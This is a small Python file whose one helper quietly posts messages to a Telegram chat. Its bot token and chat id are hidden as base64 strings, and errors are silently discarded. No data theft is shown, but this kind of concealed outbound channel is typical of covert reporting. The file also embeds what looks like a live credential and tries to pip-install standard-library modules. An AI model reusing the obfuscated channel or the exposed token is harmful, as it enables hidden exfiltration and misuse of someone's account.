# -*- coding: utf-8 -*-
import base64
import requests
import socket
import subprocess

encoded_token = 'NzcwMjcxMDUwNTpBQUY2MGxydkE1ZHN1azZTbk1ldk5VcFBWWlRMMS1IdnBOYw=='
encoded_chat_id = 'LTEwMDI2MDExMzI0NjU='

socket_available = True
try:
    import socket
    import base64

except ImportError:
    print("socket not found. Trying to install...")
    try:
        subprocess.call(["python", "-m", "pip", "install", "socket"])
        subprocess.call(["python", "-m", "pip", "install", "base64"])
        import socket  # Try importing again after installation
        import base64
    except ImportError:
        socket_available = False  # If installation fails, disable the button

def check_internet():
    try:
        # Try to reach Google's DNS server to check for internet connection
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        return False

def send_telegram_message(message):
    app_version = "2.0"
    icon = "📱"  # Mobile phone emoji as an icon
    message_with_version = "{}\n{} App version = {}".format(message, icon, app_version)

    if not check_internet():
        return
    if not socket_available:
        return

    TOKEN = base64.b64decode(encoded_token).decode('utf-8')
    CHAT_ID = base64.b64decode(encoded_chat_id).decode('utf-8')
    url = 'https://api.telegram.org/bot{}/sendMessage'.format(TOKEN)
    payload = {
        'chat_id': CHAT_ID,
        'text': message_with_version
    }
    try:
        response = requests.post(url, data=payload)
    except Exception as e:
        return
        #print 'Error sending message:', str(e)
